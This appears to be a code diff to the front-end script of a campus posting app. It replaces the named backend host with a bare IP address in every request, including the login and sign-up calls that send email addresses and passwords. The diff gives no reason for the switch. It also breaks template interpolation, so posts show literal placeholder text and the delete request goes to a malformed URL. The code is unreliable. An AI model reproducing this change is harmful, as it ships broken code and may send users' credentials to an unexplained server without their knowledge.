@@ -13,7 +13,7 @@ async function validForm() {
     if (name === "" || /\d/.test(name)) return alert("Invalid name");
     if (!email.endsWith("@truman.edu")) return alert("Email must end with @truman.edu");
 
-    const response = await fetch("https://trufindbackend.onrender.com/send-code", {
+    const response = await fetch("https://100.55.59.69/send-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, name, password })
@@ -32,7 +32,7 @@ async function verifyCode() {
     const code = document.getElementById("codeInput").value.trim();
     const email = localStorage.getItem("verifyingEmail");
 
-    const response = await fetch("https://trufindbackend.onrender.com/verify-code", {
+    const response = await fetch("https://100.55.59.69/verify-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, code })
@@ -50,7 +50,7 @@ async function login() {
     const email = document.getElementById("loginEmail").value.trim();
     const pass = document.getElementById("loginPassword").value.trim();
 
-    const response = await fetch("https://trufindbackend.onrender.com/login", {
+    const response = await fetch("https://100.55.59.69/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, password: pass })
@@ -91,7 +91,7 @@ if (postForm) {
             formData.append("image", file);
         }
 
-        const res = await fetch("https://trufindbackend.onrender.com/posts", {
+        const res = await fetch("https://100.55.59.69/posts", {
             method: "POST",
             body: formData
         });
@@ -107,7 +107,7 @@ if (postForm) {
 }
 
 async function getAllPosts() {
-    const response = await fetch("https://trufindbackend.onrender.com/all-posts");
+    const response = await fetch("https://100.55.59.69/all-posts");
     const data = await response.json();
     const container = document.getElementById("postContainer");
     const currentUser = localStorage.getItem("userId");
@@ -116,7 +116,7 @@ async function getAllPosts() {
         container.innerHTML = "";
         data.posts.forEach(post => {
             const div = document.createElement("div");
-            let html = `<h3>${post.name}</h3><p>${post.description}</p><p><small>${new Date(post.created_at).toLocaleString()}</small></p>`;
+            let html = `<h3>post.name</h3><p>{post.description}</p><p><small>${new Date(post.created_at).toLocaleString()}</small></p>`;
             if (post.image_url && post.image_url !== "No image") html += `<img src="${post.image_url}" width="200">`;
             if (post.user_id.toString() === currentUser) html += `<button onclick="deletePost(${post.id})">Delete</button>`;
             html += `<hr>`;
@@ -136,7 +136,7 @@ async function deletePost(id) {
     if (!confirmDelete) return;
 
     const userId = localStorage.getItem("userId");
-    const res = await fetch(`https://trufindbackend.onrender.com/delete-posts/${id}?userId=${userId}`, { method: "DELETE" });
+    const res = await fetch(`https://100.55.59.69/delete-posts/id?userId={userId}`, { method: "DELETE" });
     const data = await res.json();
 
     if (data.success) {
@@ -146,3 +146,5 @@ async function deletePost(id) {
         alert("Delete failed");
     }
 }
+
+
